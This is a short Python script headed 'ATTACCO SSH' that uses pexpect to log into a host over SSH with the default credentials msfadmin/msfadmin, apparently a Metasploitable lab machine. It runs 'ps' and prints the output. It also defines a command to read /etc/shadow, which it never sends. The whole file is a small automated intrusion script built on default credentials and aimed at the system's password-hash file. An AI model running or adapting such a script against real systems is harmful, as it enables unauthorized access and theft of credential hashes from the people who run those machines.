#!/usr/bin/python3.7

# ATTACCO SSH

import subprocess
import os
import sys
import pexpect as px

user = 'msfadmin'
password = 'msfadmin'
ip = '192.168.1.7'
server_ssh = "msfadmin@192.168.1.7"
comando_ssh = "cat /etc/shadow"


applicazione = px.spawn("ssh msfadmin@192.168.1.7")
risposta = applicazione.expect("password:")

applicazione.sendline("msfadmin")
prompt = applicazione.expect([px.TIMEOUT, '>>> ','> ','~$ ','# ','\$ '])


applicazione.sendline('ps')
applicazione.expect([px.TIMEOUT,'# ','>>> ','> ','\$ ','~$ '])
print(applicazione.before)
v = applicazione.before
print(v[0:10])





        